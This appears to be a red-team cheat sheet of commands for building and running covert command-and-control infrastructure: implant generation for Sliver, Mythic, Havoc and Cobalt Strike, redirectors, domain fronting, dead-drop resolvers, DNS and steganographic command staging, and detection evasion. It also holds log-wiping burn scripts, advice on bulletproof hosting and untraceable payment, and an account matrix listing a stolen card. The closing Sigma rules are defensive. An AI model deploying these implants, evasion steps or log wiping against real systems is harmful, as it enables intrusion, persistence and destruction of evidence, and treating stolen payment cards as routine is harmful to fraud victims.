# Red Team Infrastructure — Payloads & Commands

> Offensive commands for building, deploying, and operating stealthy C2 infrastructure. Each section focuses on a specific infrastructure layer. Use during scoping, deployment, operation, and burn phases of red team engagements.

## Section 1 — Recon (target-side egress discovery)

### 1.1 Egress port matrix

```bash
# Test all common outbound ports
for proto in tcp udp; do
  for port in 53 80 443 123 445 3306 3389 5432 5900 8080 8443; do
    flag=$([ "$proto" = "udp" ] && echo "-u" || echo "")
    timeout 2 nc $flag -vz exit-proxy.example.com $port 2>&1 | grep -E "succeeded" \
      && echo "$proto/$port OPEN"
  done
done
```

### 1.2 DLP/SWG identification

```bash
# Response headers
curl -sI https://www.google.com | grep -iE "zscaler|netskope|forcepoint|bluecoat|symantec|cisco|paloalto|fortinet"

# TLS inspection (look for interception CA)
echo | openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com 2>&1 | grep -iE "issuer=|verify return"

# DoH availability (bypasses DNS-level DLP)
curl -s 'https://1.1.1.1/dns-query?name=test.example.com&type=A' -H 'Accept: application/dns-json' | jq -r '.Answer[0].data'
```

### 1.3 Domain categorization check

```bash
# Bluecoat / Symantec
curl -s "https://sitereview.bluecoat.com/resource/lookup-request/$DOMAIN" | jq .

# Fortiguard
curl -s "https://www.fortiguard.com/webfilter?q=$DOMAIN" | grep -oE 'Category:.*</h'

# VirusTotal
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=$DOMAIN&apikey=$VT_API" | jq -r '.categories'
```

## Section 2 — Domain procurement

### 2.1 Bulk domain search (Namecheap API)

```bash
# Search availability
curl -s "https://api.namecheap.com/xml.response?ApiUser=$NC_USER&ApiKey=$NC_KEY&UserName=$NC_USER&Command=namecheap.domains.check&DomainList=$DOMAIN1,$DOMAIN2"

# Register
curl -s "https://api.namecheap.com/xml.response?ApiUser=$NC_USER&ApiKey=$NC_KEY&UserName=$NC_USER&Command=namecheap.domains.create&DomainName=$DOMAIN&Years=1"
```

### 2.2 Privacy-respecting registrars

```bash
# Njalla (privacy)
curl -s -H "Authorization: Njal $TOKEN" \
  https://njal.la/api/1/add_domain/ \
  -d "domain=$DOMAIN&years=1&method=bitcoin"

# OrangeWebsite (Iceland)
# Cock.li / Hostkey (bulletproof)

# Pay via Monero (privacy)
monero-wallet-cli --transfer $XMR_ADDRESS $AMOUNT
```

### 2.3 Domain age check

```bash
for d in $(cat domains.txt); do
  age=$(whois $d 2>/dev/null | grep -i "creation date" | awk -F': ' '{print $2}' | head -1)
  echo "$d | created: $age"
done
```

## Section 3 — Hosting procurement

### 3.1 VPS providers (compartmentalized)

```bash
# DigitalOcean (cheap, fast)
doctl compute droplet create c2-1 --size s-1vcpu-1gb --image ubuntu-22-04-x64 --region nyc3 --ssh-keys $KEY

# Vultr
vultr instance create --label c2-1 --region ewr --plan vc2-1c-1gb --os Ubuntu_22_04

# Hetzner (EU)
hcloud server create --name c2-1 --type cx22 --image ubuntu-22.04 --location nbg1

# AWS (legitimate-looking)
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.micro --key-name my-key

# Linode
linode-cli linodes create --label c2-1 --type g6-nanode-1 --region us-east --image linode/ubuntu22.04
```

### 3.2 Compartmentalization rules

```bash
# Per-team hosting
Team-A (C2 backend):    DigitalOcean, prepaid card 1234
Team-B (Redirector 1):  Vultr, crypto Monero
Team-C (Redirector 2):  Hetzner, crypto BTC
Team-D (Staging):       AWS, separate AWS account
Team-E (DNS):           Cloudflare (free), separate account

# NEVER share SSH keys, payment methods, or accounts across teams
```

### 3.3 Provider-specific OPSEC

```bash
# Use WhoisGuard / Njalla on domains
# Use crypto payments where possible
# Use VPS in different geographic regions per team
# Use different VPS images (Ubuntu / Debian / Alpine) per team
```

## Section 4 — Sliver C2 deployment

### 4.1 Single-server Sliver

```bash
curl https://sliver.sh/install | sudo bash
sliver

# Generate implant (HTTPS)
sliver > generate --http https://c2.example.com:8443 --os linux --arch amd64

# Listener
sliver > http --domain c2.example.com --web-port 8443

# Run implant
./implant.elf

# Multi-protocol fallback
sliver > generate --http https://c2.example.com \
                  --dns dns.example.com \
                  --mtls mtls.example.com:8888
```

### 4.2 Sliver mTLS

```bash
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Generate implant
sliver > generate --mtls mtls.example.com:8888 --os windows

# Implant on victim
.\implant.exe
```

### 4.3 Sliver DNS

```bash
sliver > dns --domains dns.example.com --lhost 0.0.0.0 --lport 53

sliver > generate --dns dns.example.com --os linux

# DNS TXT records for beacon
```

### 4.4 Sliver WireGuard

```bash
sliver > wg --lhost 0.0.0.0 --lport 53

sliver > generate --wg wg.example.com:53 --os linux
```

### 4.5 Sliver implant customization

```bash
sliver > generate --http https://c2.example.com \
                  --os linux \
                  --arch amd64 \
                  --skip-symbols \
                  --encrypt-net \
                  --debug

# Custom user-agent
sliver > profiles new --http https://c2.example.com --user-agent "Mozilla/5.0 (X11; Linux x86_64)" my-profile
```

## Section 5 — Mythic C2 deployment

### 5.1 Mythic install

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic

# Install Docker
sudo ./install_docker_ubuntu.sh

# Configure
sudo nano .env  # set SERVER_IP, MYTHIC_ADMIN_USER, MYTHIC_ADMIN_PASSWORD

# Start
sudo ./mythic-cli start

# Verify
sudo ./mythic-cli status
```

### 5.2 Install agents + C2 profiles

```bash
# Apollo agent (.NET, Windows)
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo

# Athena agent (cross-platform .NET)
sudo ./mythic-cli install github https://github.com/MythicAgents/Athena

# HTTP profile
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http

# TCP profile
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/tcp

# WebSocket profile
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/websocket

# Rebuild
sudo ./mythic-cli rebuild
```

### 5.3 Mythic payload creation

```bash
# Via web UI
# 1. Login at https://SERVER_IP
# 2. Create new payload
# 3. Select agent (Apollo / Athena)
# 4. Select C2 profile (HTTP)
# 5. Set parameters (URL, sleep, jitter)
# 6. Submit
# 7. Download payload
```

## Section 6 — Havoc C2 deployment

### 6.1 Havoc install

```bash
git clone https://github.com/HavocFramework/Havoc
cd Havoc/teamserver
go build -o Havoc teamserver.go

# Build client
cd ../client
make

# Start teamserver
cd ../teamserver
./Havoc -t Alpha --debug

# Connect via client
cd ../client
./Havoc
```

### 6.2 Havoc implant generation

```bash
# In Havoc GUI:
# 1. View → Payloads
# 2. New Payload
# 3. Select Listener (HTTP/S)
# 4. Set Architecture (x64)
# 5. Format (Windows EXE / DLL / Shellcode)
# 6. Generate
```

## Section 7 — Covenant C2 deployment

### 7.1 Covenant install

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
dotnet build
dotnet run

# Access via https://127.0.0.1:7443
```

### 7.2 Covenant listener

```bash
# In web UI:
# 1. Listeners → Create
# 2. Select HTTP/S listener
# 3. Set BindAddress, BindPort, ConnectPort
# 4. Set Profile (default / custom)
# 5. Create
```

## Section 8 — PoshC2 deployment

### 8.1 PoshC2 install

```bash
curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash

# Start server
sudo posh-server

# Start IM plant client
sudo posh -i default
```

## Section 9 — Brute Ratel C2

### 9.1 Brute Ratel deployment (commercial)

```bash
# Requires license from rupturerm.com ($2500+)
# Download BRc4 binary
./BRc4_Linux -addr 0.0.0.0:443 -cert cert.pem -key key.pem

# Generate implant
./BRc4_Linux -gen-client -listener https -arch x64

# Connect to operator UI
./BRc4_Linux -client
```

## Section 10 — Cobalt Strike deployment

### 10.1 Cobalt Strike teamserver

```bash
# Requires license ($3000+/user)
./teamserver $C2_IP $PASSWORD

# Connect via client
./cobaltstrike-client
```

### 10.2 Cobalt Strike malleable C2 profile

```bash
cat > custom.profile << 'EOF'
http-get {
    set uri "/api/v1/data";
    client {
        metadata {
            base64url;
            prepend "session=";
            header "Cookie";
        }
        parameter "id" "abc123";
    }
    server {
        header "Content-Type" "application/json";
        output {
            json {
                "ts" "20240101T000000Z";
                "data" "base64_data";
            }
        }
    }
}
EOF

# Apply
./c2lint custom.profile
```

## Section 11 — Nginx mTLS redirector

### 11.1 Generate CA + client certs

```bash
mkdir /etc/nginx/mtls && cd /etc/nginx/mtls

# CA
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt -subj "/CN=RedTeam CA"

# Client cert (per implant fleet)
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=implant-fleet-A"
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out client.crt -days 365 -extfile <(echo "extendedKeyUsage=clientAuth")
```

### 11.2 Nginx config

```bash
cat > /etc/nginx/conf.d/c2.conf << 'EOF'
server {
    listen 443 ssl http2;
    server_name redirector.example.com;

    ssl_certificate /etc/letsencrypt/live/redirector/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector/privkey.pem;

    # mTLS - only implants with correct client cert pass
    ssl_client_certificate /etc/nginx/mtls/ca.crt;
    ssl_verify_client on;

    # Only POST to /api/ passes
    location /api/ {
        proxy_pass https://c2-backend.example.com:8443;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # All other paths return 404 (look like any site)
    location / {
        return 404;
    }
}
EOF

sudo nginx -t && sudo systemctl reload nginx
```

### 11.3 mTLS test

```bash
# Without client cert (should fail)
curl -v https://redirector.example.com/ 2>&1 | grep "400 Bad Request"

# With client cert (should pass)
curl --cert client.crt --key client.key https://redirector.example.com/api/health
```

## Section 12 — Cloudflare worker redirector

### 12.1 Worker setup

```bash
npm install -g wrangler
wrangler login  # use separate account

mkdir c2-worker && cd c2-worker
wrangler init --yes

cat > src/index.js << 'EOF'
export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // Steganography filter: only POST with X-Implant-Auth header
    if (request.method !== 'POST' || !request.headers.get('X-Implant-Auth')) {
      return new Response('Not Found', { status: 404 });
    }

    // Forward to backend
    url.hostname = 'c2-backend.example.com';
    url.port = '8443';

    // Strip identifying headers
    const newHeaders = new Headers(request.headers);
    newHeaders.delete('X-Implant-Auth');

    return fetch(url.toString(), {
      method: request.method,
      headers: newHeaders,
      body: request.body
    });
  }
}
EOF

# Deploy
wrangler deploy
```

### 12.2 Custom domain (Cloudflare)

```bash
# Add custom domain in Cloudflare dashboard
# CNAME: front.example.com → c2-worker.workers.dev
```

## Section 13 — Domain fronting

### 13.1 Cloudflare domain fronting (works 2024)

```bash
# Implant sets Host header to attacker origin while SNI shows legit customer
curl -H "Host: hidden-c2.example.com" \
     https://legitimate-cdn-customer.example.com/ \
     --data-binary @payload.bin

# Cloudflare routes by Host header (post-2017)
# Defenders see SNI: legitimate-cdn-customer.example.com
# But the actual backend is hidden-c2.example.com
```

### 13.2 Fastly domain fronting

```bash
curl -H "Host: hidden-c2.example.com" \
     https://legitimate-fastly-customer.com/
```

### 13.3 AWS CloudFront (fronting removed 2018)

```bash
# No longer works for cross-account fronting
# Still works for same-account routing
```

## Section 14 — Dead-drop resolvers

### 14.1 GitHub gist resolver

```bash
# Create gist with C2 IP
GH_PAT=$(cat ~/.github_token)
C2_IP="203.0.113.10"

GIST_RESP=$(curl -s -X POST -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists \
  -d "{\"description\":\"config\",\"files\":{\"config.txt\":{\"content\":\"$C2_IP\"}}}")

GIST_ID=$(echo $GIST_RESP | jq -r .id)

# Implant polls gist
C2_IP=$(curl -s https://gist.githubusercontent.com/$GIST_USER/$GIST_ID/raw/config.txt | tr -d '[:space:]')

# Rotate IP
NEW_IP="198.51.100.20"
curl -s -X PATCH -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists/$GIST_ID \
  -d "{\"files\":{\"config.txt\":{\"content\":\"$NEW_IP\"}}}"
```

### 14.2 Telegram resolver

```bash
# Create bot via @BotFather
TOKEN="bot_token"
CHAT_ID="chat_id"

# Implant polls
UPDATES=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?chat_id=$CHAT_ID&offset=-1")
C2_IP=$(echo $UPDATES | jq -r '.result[-1].message.text')

# Operator updates
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
  -d "chat_id=$CHAT_ID" -d "text=$NEW_IP"
```

### 14.3 Reddit resolver

```bash
# Create post via OAuth
# Implant polls via Reddit public API
curl -s "https://www.reddit.com/r/subreddit/comments/post_id.json" | jq -r '.[1].data.children[0].data.body'
```

## Section 15 — Certificate automation

### 15.1 Let's Encrypt via DNS-01 (wildcard)

```bash
sudo apt install certbot python3-certbot-dns-cloudflare

cat > ~/.cloudflare.ini << 'EOF'
dns_cloudflare_api_token = REPLACE_WITH_YOUR_CF_TOKEN
EOF
chmod 600 ~/.cloudflare.ini

sudo certbot certonly \
  --dns-cloudflare \
  --dns-cloudflare-credentials ~/.cloudflare.ini \
  -d '*.redirector.example.com' \
  --non-interactive \
  --agree-tos \
  -m admin@redirector.com
```

### 15.2 Auto-renewal

```bash
sudo certbot renew --dry-run
sudo systemctl enable --now certbot.timer
```

### 15.3 Certificate pinning (implant side)

```bash
# Pin leaf cert SHA-256 (immune to CA compromise)
PIN=$(openssl x509 -in cert.pem -pubkey -noout | \
  openssl pkey -pubin -outform der | \
  openssl dgst -sha256 -binary | base64)

# Implant uses pin for TLS handshake
# Rollout new cert with old → implant uses new → revoke old
```

## Section 16 — Infrastructure-as-code

### 16.1 Terraform multi-VPS

```bash
cat > main.tf << 'EOF'
terraform {
  required_providers {
    digitalocean = { source = "digitalocean/digitalocean", version = "~> 2.0" }
  }
}

variable "do_token" {}
variable "ssh_key_id" {}

provider "digitalocean" {
  token = var.do_token
}

resource "digitalocean_droplet" "c2" {
  name     = "c2-${count.index}"
  region   = "nyc3"
  size     = "s-1vcpu-1gb"
  image    = "ubuntu-22-04-x64"
  count    = 2
  ssh_keys = [var.ssh_key_id]
}

resource "digitalocean_droplet" "redirector" {
  name     = "redirector-${count.index}"
  region   = "ams3"
  size     = "s-1vcpu-1gb"
  image    = "ubuntu-22-04-x64"
  count    = 3
  ssh_keys = [var.ssh_key_id]
}

output "c2_ips" {
  value = digitalocean_droplet.c2[*].ipv4_address
}

output "redirector_ips" {
  value = digitalocean_droplet.redirector[*].ipv4_address
}
EOF

terraform init
terraform apply -auto-approve -var "do_token=$DO_TOKEN" -var "ssh_key_id=$SSH_KEY_ID"
```

### 16.2 Ansible C2 fleet deployment

```bash
cat > hosts.ini << 'EOF'
[c2]
c2-0 ansible_host=203.0.113.10
c2-1 ansible_host=203.0.113.11

[redirector]
redirector-0 ansible_host=198.51.100.20
redirector-1 ansible_host=198.51.100.21
redirector-2 ansible_host=198.51.100.22
EOF

cat > deploy.yml << 'EOF'
---
- hosts: c2
  tasks:
    - name: Install Sliver
      shell: curl https://sliver.sh/install | sudo bash

    - name: Start Sliver
      shell: sliver-server daemon &

- hosts: redirector
  tasks:
    - name: Install Nginx
      apt: name=nginx state=present update_cache=yes

    - name: Copy Nginx config
      copy:
        src: nginx-c2.conf
        dest: /etc/nginx/conf.d/c2.conf
      notify: reload nginx

  handlers:
    - name: reload nginx
      service: name=nginx state=reloaded
EOF

ansible-playbook -i hosts.ini deploy.yml
```

## Section 17 — OPSEC compartmentalization

### 17.1 Account separation

```bash
# Per-team account matrix
Team | Hosting Account | Payment Method | SSH Key
A    | DO account A    | Prepaid 1234   | keyA
B    | Vultr account B | Monero         | keyB
C    | Hetzner account C | BTC          | keyC
D    | AWS account D   | Stolen card D  | keyD
E    | CF account E    | (free tier)    | keyE

# Verify no cross-contamination
for key in ~/.ssh/*.pub; do
  md5=$(ssh-keygen -l -E md5 -f $key | awk '{print $NF}')
  echo "$key: $md5"
done
```

### 17.2 Burn plan

```bash
#!/bin/bash
# burn.sh - execute when infrastructure detected

# 1. Stop services
ssh c2-0 'systemctl stop sliver'
ssh c2-1 'systemctl stop mythic'

# 2. Revoke certs
ssh cert-team 'certbot revoke --cert-path /etc/letsencrypt/live/redirector/cert.pem'

# 3. Wipe logs
ssh c2-0 'shred -uvz /var/log/*'
ssh redirector-0 'shred -uvz /var/log/nginx/*'

# 4. Destroy infrastructure
cd /infra/terraform && terraform destroy -auto-approve

# 5. Migrate domains
python3 migrate_domains.py --new-provider njalla

# 6. Update dead-drop resolver
NEW_IP="203.0.113.99"
curl -X PATCH -H "Authorization: token $GH_PAT" \
  https://api.github.com/gists/$GIST_ID \
  -d '{"files":{"config.txt":{"content":"'"$NEW_IP"'"}}}'

# 7. Document burned assets (avoid 6+ months)
echo "$(date) | burned: c2-0, c2-1, redirector-0/1/2, redirector.example.com" >> /infra/burn-log.txt
```

## Section 18 — Detection monitoring

### 18.1 VirusTotal monitoring

```bash
# Check if C2 domain/IP is flagged
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=$DOMAIN&apikey=$VT_API" | jq -r '.detected_urls'

# Auto-scan every hour
while true; do
  for d in $(cat domains.txt); do
    score=$(curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=$d&apikey=$VT_API" | jq -r '.detected_urls | length')
    [ $score -gt 0 ] && echo "ALERT: $d has $score detections"
  done
  sleep 3600
done
```

### 18.2 Cisco Umbrella categorization

```bash
# Check category
curl -s "https://investigate.umbrella.com/domains/categorization/$DOMAIN" -H "Authorization: Bearer $TOKEN"

# Uncategorize via appeals (legitimate-looking use)
```

### 18.3 TLS fingerprint detection

```bash
# Implant TLS fingerprint (JA3)
# Defenders may detect non-standard JA3 hashes
# Solution: use implant that mimics browser JA3

# Test JA3
echo | openssl s_client -connect c2.example.com:443 2>/dev/null | \
  python3 -c "import sys; print(sys.stdin.read())"
```

## Section 19 — Listener hardening

### 19.1 Sliver listener config

```bash
sliver > http --domain c2.example.com \
              --web-port 8443 \
              --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
              --timeout 30s \
              --implant-config /tmp/config.json
```

### 19.2 Mythic HTTP profile

```bash
# Custom HTTP profile that mimics legitimate API
{
  "GET": [
    {
      "url": "/api/v1/users",
      "headers": {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json"
      }
    }
  ],
  "POST": [
    {
      "url": "/api/v1/data",
      "headers": {
        "Content-Type": "application/json"
      }
    }
  ]
}
```

## Section 20 — Operator OPSEC

### 20.1 Operator rules

```bash
# 1. Never reuse accounts across teams / engagements
# 2. Never log in from corporate VPN
# 3. Never use real identity for hosting
# 4. Never discuss infrastructure in customer Slack
# 5. Use hardware 2FA token
# 6. Use privacy-respecting browsers (Brave / Tor)
# 7. Use Monero for non-attribution
# 8. Verify VT / Cisco Umbrella categorization before deploy
# 9. Document every burned asset
# 10. Rotate SSH keys per engagement
```

### 20.2 Operator anonymity

```bash
# Use separate workstation for red team ops
# Install Tails OS or Whonix
# Use hardware tokens (YubiKey) for all auth
# Use Monero for all payments
# Never mix operator identities
```

## Section 21 — Cloud-native C2

### 21.1 AWS-based C2

```bash
# Lambda redirector (serverless, no static IP)
aws lambda create-function --function-name c2-redirect \
  --runtime python3.11 \
  --handler index.handler \
  --zip-file fileb://redirect.zip \
  --role arn:aws:iam::123456789012:role/lambda-role

# API Gateway front
aws apigateway create-rest-api --name C2API
```

### 21.2 Azure Functions C2

```bash
az functionapp create --name c2-redirect \
  --resource-group redteam-rg \
  --storage-account mystorage \
  --consumption-plan-location eastus \
  --runtime python --functions-version 4
```

### 21.3 Google Cloud Functions

```bash
gcloud functions deploy c2-redirect \
  --runtime python311 \
  --trigger-http \
  --allow-unauthenticated
```

## Section 22 — Engagement cleanup

### 22.1 Wipe C2 server

```bash
# Stop services
sudo systemctl stop mythic sliver havoc

# Wipe databases
sudo rm -rf /opt/mythic/postgres/
sudo shred -uvz /var/lib/sliver/*

# Wipe logs
sudo shred -uvz /var/log/nginx/*
sudo journalctl --vacuum-time=1s

# Destroy VPS
doctl compute droplet delete c2-0
```

### 22.2 Burn domains

```bash
# Re-point DNS to sinkhole
cloudflare-cli dns-edit --zone example.com --name redirector --content "0.0.0.0"

# Allow to expire (60+ days for full expiry)
# Or transfer to throwaway registrar
```

## Section 23 — Reporting

### 23.1 Engagement report template

```markdown
# Red Team Infrastructure Engagement Report

## Executive Summary
- Engagement dates: 2024-XX-XX to 2024-XX-XX
- C2 platforms used: Sliver, Mythic
- Domains deployed: 4 (2 tier-1, 2 tier-2)
- Redirector chain: 3-tier (Cloudflare → Worker → Nginx mTLS)
- Detection: 0 of 4 domains flagged by VT
- Burn events: 1 (redirector-2 detected day 3, rebuilt)

## Infrastructure Timeline
| Date | Event |
|------|-------|
| Day 0 | Infrastructure deployed |
| Day 1 | Initial implant beacon |
| Day 3 | Redirector-2 detected (rebuilt) |
| Day 7 | Engagement complete |

## Detection Gaps
- CDN-fronted traffic not detected by SWG
- mTLS redirector not flagged
- Dead-drop resolver (GitHub gist) not flagged

## Recommendations
- TLS JA3 fingerprinting
- CDN egress to non-CDN origins alerting
- GitHub gist polling from server fleet

## Burn Log
- redirector.example.com (day 3, VT flag)
- c2-1.example.com (day 5, rebuilt)

## Cleanup
- All VPS destroyed
- All domains retired for 6 months
- All certs revoked
```

### 23.2 SOC handoff

```markdown
## Detection signatures authored

### Sigma rule: CDN-fronted C2 beacon
logsource:
  product: firewall
  service: tls
detection:
  selection:
    ssl.sni|contains: cloudflare
    http.host|notcontains: cloudflare
  condition: selection

### Sigma rule: GitHub gist polling from server
logsource:
  product: linux
  service: auditd
detection:
  selection:
    exe|endswith:
      - curl
      - wget
    url|contains: gist.githubusercontent.com
  filter:
    user: developer
  condition: selection and not filter
```

## Section 24 — Steganography in C2

### 24.1 Embed commands in cover image

```bash
# Generate cover image
ffmpeg -f lavfi -i color=black:s=1920x1080:d=1 cover.png

# Embed command in PNG LSB
steghide embed -cf cover.png -ef commands.txt -p REPLACE_WITH_YOUR_PW -sf stego.png

# Upload to attacker-controlled CDN
curl -X POST https://cdn.example.com/upload -F "file=@stego.png"

# Implant downloads cover image + extracts
curl -s https://cdn.example.com/stego.png > stego.png
steghide extract -sf stego.png -p REPLACE_WITH_YOUR_PW -xf commands.txt
```

### 24.2 Steganographic payload over DNS TXT

```bash
# Encode command in TXT record (multiple 64-byte chunks)
CMD="whoami && id && hostname"
ENC=$(echo "$CMD" | base64 | tr -d '=' | tr '+/' '-_')
# Split into 60-byte chunks (DNS label max 63)
i=0
for chunk in $(echo $ENC | fold -w60); do
  nsupdate << EOF
server ns1.example.com
update add chunk$i.cmd.example.com 60 TXT "$chunk"
send
EOF
  i=$((i+1))
done

# Implant queries chunks + assembles
for i in 0 1 2 3; do
  dig +short TXT chunk$i.cmd.example.com @ns1.example.com | tr -d '"' >> assembled.txt
done
base64 -d assembled.txt
```

## Section 25 — Detection engineering (red team side)

### 25.1 Self-monitor for detection

```bash
# Run a SIGMA rule against your own logs to verify it would catch you
sigma scan -t splunk rules/c2-beacon-detect.yml

# Test your own JA3 against published C2 JA3 lists
python3 ja3.py | grep -f known-c2-ja3.txt

# Submit your C2 IP to VT (verify score stays at 0/90)
curl -s "https://www.virustotal.com/vtapi/v2/ip-address/report?ip=$C2_IP&apikey=$VT_API" | jq '.detected_urls | length'
```

### 25.2 Tune beacon to evade common rules

```bash
# Evade Suricata beacon rule (alert on fixed-interval)
# Use gaussian-distributed jitter instead of fixed
sliver > profiles new --jitter-gaussian --mean 30s --stddev 10s my-profile

# Evade Cobalt Strike beacon detection (sleep + jitter < 50%)
# Sleep 30s + 50% jitter defeats signature
```

## Section 26 — Operator workspace OPSEC

### 26.1 Dedicated operator workstation

```bash
# Use Tails OS or Whonix for operator workstation
# All C2 access via Tor
# No corporate VPN on operator workstation
# No personal accounts on operator workstation

# Use Qubes OS for compartmentalized VMs per engagement
qvm-create engagement-X --template whonix-ws --label red
```

### 26.2 Hardware tokens + 2FA

```bash
# Use YubiKey for SSH keys
ykman ssh-config add-key ~/.ssh/engagement-A

# Use hardware TOTP for hosting accounts
ykman oath accounts add digitalocean
```

## Section 27 — IPv6 + alternative transports

### 27.1 IPv6 C2

```bash
# Many firewalls have weaker IPv6 rules
ip -6 addr add 2001:db8::1/64 dev eth0

# Sliver IPv6 listener
sliver > http --lhost :: --lport 8443

# Implant beacon over IPv6
sliver > generate --http http://[2001:db8::1]:8443
```

### 27.2 WebSocket C2

```bash
# Mythic WebSocket profile
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/websocket

# Implant uses WebSocket — looks like web app traffic
# Bypasses HTTP-specific inspection
```

### 27.3 gRPC + HTTP/2 C2

```bash
# Merlin uses HTTP/2
merlin > set URL https://cdn.example.com
merlin > set Protocol h2c

# gRPC blends with modern microservices traffic
```

## Section 28 — Cross-platform implant deployment

### 28.1 Windows implant

```bash
# Sliver Windows EXE
sliver > generate --http https://c2.example.com --os windows --arch amd64 --format exe

# Windows DLL
sliver > generate --http https://c2.example.com --os windows --format shared

# Windows shellcode
sliver > generate --http https://c2.example.com --os windows --format shellcode
```

### 28.2 Linux implant

```bash
# Sliver Linux EXE
sliver > generate --http https://c2.example.com --os linux --arch amd64

# Linux shared lib
sliver > generate --http https://c2.example.com --os linux --format shared
```

### 28.3 macOS implant

```bash
# Sliver macOS
sliver > generate --http https://c2.example.com --os mac --arch arm64

# Mach-O binary
# Note: must bypass Gatekeeper + notarization
```

### 28.4 Cross-platform .NET (via Mythic Athena)

```bash
# Athena runs on .NET Core / .NET 5+
# Supports Windows, Linux, macOS from single binary
sudo ./mythic-cli install github https://github.com/MythicAgents/Athena
```

## Section 29 — Infrastructure failover

### 29.1 Multi-channel fallback

```bash
# Implant tries HTTPS, falls back to DNS, then mTLS
sliver > generate \
  --http https://primary.example.com \
  --dns dns-fallback.example.com \
  --mtls mtls-fallback.example.com:8888 \
  --retry-interval 60s
```

### 29.2 Geo-distributed redirectors

```bash
# Deploy redirectors in 3 regions
# Implant uses geo-DNS to find closest
cloudflare-cli dns-edit --zone example.com --name redirector --content "geo"

# Anycast IP via Cloudflare
# Implant always hits nearest CDN edge
```

### 29.3 Hot-standby C2

```bash
# Maintain warm C2 server in standby
# Cut over if primary detected
ansible-playbook -i standby.ini promote-to-primary.yml
```

## Section 30 — Reporting + SOC handoff

### 30.1 Detection rules authored (Sigma)

```yaml
title: C2 Beacon via Fixed-Interval HTTPS
status: experimental
description: Detects beaconing via fixed-interval HTTPS POST
logsource:
  product: firewall
  service: tls
detection:
  selection:
    ssl.sni|contains: "c2"
    http.method: POST
  timeframe: 5m
  condition: selection | count() > 10
level: high
```

### 30.2 Sigma rule for dead-drop resolver

```yaml
title: GitHub Gist Polling from Server
status: experimental
description: Server fleet polling GitHub gist (potential dead-drop resolver)
logsource:
  product: linux
  service: auditd
detection:
  selection:
    exe|endswith:
      - curl
      - wget
    url|contains: gist.githubusercontent.com
  filter:
    user: developer
  condition: selection and not filter
level: high
```

### 30.3 Sigma rule for domain fronting

```yaml
title: CDN Domain Fronting Anomaly
status: experimental
description: SNI does not match Host header (potential domain fronting)
logsource:
  product: firewall
  service: tls
detection:
  selection:
    ssl.sni|contains: cloudflare
    http.host|notcontains: cloudflare
  condition: selection
level: critical
```

### 30.4 SOC handoff checklist

```markdown
- [ ] All detections documented
- [ ] Sigma rules authored for ≥3 gaps
- [ ] JA3 + JA4 fingerprints shared with SOC
- [ ] C2 domains added to internal blocklist
- [ ] Engagement timeline reviewed with SOC
- [ ] Next engagement scheduled with detection tuning
- [ ] Final report delivered
```
